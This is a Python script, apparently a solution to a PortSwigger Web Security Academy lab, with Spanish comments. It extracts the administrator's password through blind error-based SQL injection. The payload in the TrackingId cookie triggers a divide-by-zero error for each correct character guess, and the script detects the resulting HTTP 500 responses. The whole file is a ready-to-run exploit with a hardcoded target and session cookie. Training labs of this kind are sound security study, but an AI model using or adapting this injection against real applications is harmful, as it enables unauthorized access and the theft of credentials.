#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a0e00a00372e9a1808908f3003d00c7.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password = ""

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(1, 21):	#Esto hace que pruebe hasta 20 caracteres
		for character in characters:

			cookies = {
				'TrackingId': "JcghQJrdTU2JxTFw'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
				'session': 'uIgDP6wFHLAewh2oBh1xLh2Zz9tv5WI3'
			}

			p1.status(cookies['TrackingId'])

			r = requests.get(main_url, cookies=cookies)

			if r.status_code == 500:	#Comparacion con el codifo de estado de la pagina
				password += character
				p2.status(password)
				break

if __name__ == '__main__':

	makeRequest()
